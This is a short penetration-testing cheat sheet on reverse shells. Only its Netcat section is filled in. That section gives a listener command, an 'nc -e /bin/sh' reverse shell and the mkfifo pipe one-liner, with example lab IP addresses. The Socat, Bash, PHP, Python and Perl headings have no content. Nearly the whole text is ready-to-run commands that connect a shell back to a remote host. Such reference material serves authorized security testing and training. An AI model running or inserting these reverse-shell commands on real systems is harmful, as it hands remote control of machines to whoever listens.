# Reverse Shells


## Netcat

### Setting A Listener

    nc -nvlp [Port]

#### Params

    [Port]: The port to listen for a connection on 

#### Examples

    nc -nlvp 4444

### With -e

Newer versions have a nice option `-e` which allows binding of a process to an nc connection

    nc -e /bin/sh [IP] [Port]

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    nc -e /bin/sh 192.168.56.101 4444

### Without -e

Older versions of nc don't have the nice `-e` option, so it has to be done slightly differently

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [Port] >/tmp/f

#### Params

    [IP]: The IP address to connect back to with a shell
    [Port]: The port to connect to

#### Examples

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.102 4444 >/tmp/f

## Socat



## Bash



## PHP



## Python



## Perl



*Note: Some shells here were sourced or modified from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*